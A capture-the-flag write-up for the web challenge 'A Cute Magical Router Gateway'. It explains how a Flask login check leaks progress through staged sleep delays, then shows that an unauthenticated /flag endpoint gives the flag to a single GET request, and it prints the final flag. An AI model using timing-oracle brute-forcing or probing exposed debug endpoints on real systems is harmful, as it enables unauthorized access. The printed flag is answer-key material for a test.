# A Cute Magical Router Gateway writeup

## Task

We are given a web challenge called `A Cute Magical Router Gateway` with the following description:

```text
A Router was found in the backrooms at THEM hq.

Looks really old, "stone paper scissors" etched on the back, whatever that means. I plugged the router into power, visited the default gateway with no room for caution whatsoever. Since this was found at THEM hq, I feel like the password might contain the string "them", but I have no clue honestly.

Pls help find the password :3
```

Flag format:

```text
THEM?!CTF{...}
```

## First look

From the repo source, the backend is a small Flask service exposing:

- `/`
- `/validate-password`
- `/flag`

At first glance, the intended idea looks similar to the sequel:

- encrypted username and password are stored server-side
- the login check leaks timing
- the description hints that the password probably contains `them`

And the validator really does contain time-based leakage.

## The validator logic

The interesting route is:

```python
@app.route('/validate-password', methods=['POST'])
def validate_password():
    ...
    if(len(username) != 45):
        return fail
    time.sleep(1)

    if username != decrypt_data(ENCRYPTED_USERNAME, private_key):
        return fail
    time.sleep(1)

    if (len(password) != 19):
        return fail
    time.sleep(1)

    if password == decrypt_data(ENCRYPTED_PASSWORD, private_key):
        return success
```

This means the endpoint leaks progress through response time:

- wrong username length: instant fail
- correct username length but wrong username: ~1 second
- correct username but wrong password length: ~2 seconds
- correct username and password length but wrong password: ~3 seconds

So the **intended** solve path was clearly:

1. infer username length
2. recover the real username
3. infer password length
4. brute-force a likely password candidate set using the timing oracle

That lines up perfectly with the challenge description.

## But the real solve is much easier

The repo README explicitly mentions that this challenge had an unintended vulnerability.

And the backend source confirms it:

```python
@app.route('/flag')
def get_flag():
    return jsonify({"flag": os.environ.get('FLAG', 'THEM?!CTF{5l0w_4nd_5734dy_l34k5_7h3_fl4g}')})
```

So instead of recovering the credentials through timing, we can simply request:

```text
GET /flag
```

and the server returns the flag directly as JSON.

No authentication is required.

## Exploitation

The whole exploit is just:

```http
GET /flag HTTP/1.1
Host: <target>
```

Response:

```json
{"flag":"THEM?!CTF{5l0w_4nd_5734dy_l34k5_7h3_fl4g}"}
```

## Why this happened

The service was apparently built around a timing-side-channel login challenge, but a helper/debug endpoint was accidentally left exposed:

- `/validate-password` contains the real challenge logic
- `/flag` bypasses all of it and returns the secret immediately

So the published challenge ended up being much easier than intended.

## Intended vs actual solve

### Intended

- exploit the timing oracle in `/validate-password`
- use the length checks and staged sleeps
- recover the right credentials

### Actual

- ignore the login flow completely
- call `/flag`
- read the flag from the JSON response

## Final flag

```text
THEM?!CTF{5l0w_4nd_5734dy_l34k5_7h3_fl4g}
```
